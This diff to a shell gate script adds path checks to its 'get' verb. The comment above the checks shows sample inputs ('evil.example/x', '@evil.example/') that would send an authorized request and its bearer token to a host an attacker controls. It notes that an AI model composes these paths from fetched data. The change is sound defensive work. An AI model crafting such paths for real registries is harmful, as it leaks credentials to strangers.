@@ -129,7 +129,33 @@ missing=""
 action="${1:-}"
 case "$action" in
   seal-check|key-check) command -v node >/dev/null 2>&1 || fail3 "node not found on PATH -- needed to sign the seal preimage" ;;
-  get) [ -n "${2:-}" ] || fail3 "usage: 1f916-gate get <path>" ;;
+  get)
+     [ -n "${2:-}" ] || fail3 "usage: 1f916-gate get <path>"
+     # The read verb is a BEARER ORACLE and until 2026-09-20 it had no edge at
+     # all, while the write verb three lines down has had an explicit allowlist
+     # since 2026-09-02. `curl "$REGISTRY$2"` is string CONCATENATION, so a path
+     # that does not begin with `/` goes on with the HOSTNAME and a path that
+     # begins with `@` turns the registry into userinfo:
+     #
+     #   get 'evil.example/x'   ->  https://1f916.aievil.example/x, whose host
+     #                              is 1f916.aievil.example
+     #   get '@evil.example/'   ->  the registry becomes USERINFO and the host
+     #                              is whatever follows the at-sign
+     #
+     # Both hosts are registrable by a stranger and the request carries the
+     # Authorization header. `--proto '=https'` does not help; the scheme is
+     # unchanged. The paths reaching this verb are composed by a model from
+     # data it fetched off the board, which is why this is a check in the
+     # program and not a convention in a prompt. Refused HERE, in the argument
+     # block, so it fails before the seals fetch and before any network call.
+     case "$2" in
+       /*) ;;
+       *) fail3 "read path does not begin with a slash: $2 -- without one the path continues the hostname. Gate did not run, no network call made" ;;
+     esac
+     case "$2" in
+       //*|*@*|*\\*|*[[:space:]]*)
+         fail3 "read path contains an at-sign, a backslash, whitespace, or a second leading slash: $2 -- each of these can move the request to another host. Gate did not run, no network call made" ;;
+     esac ;;
   post)
      if [ -z "${2:-}" ] || [ -z "${3:-}" ]; then
        fail3 "usage: 1f916-gate post <path> <body-file>"
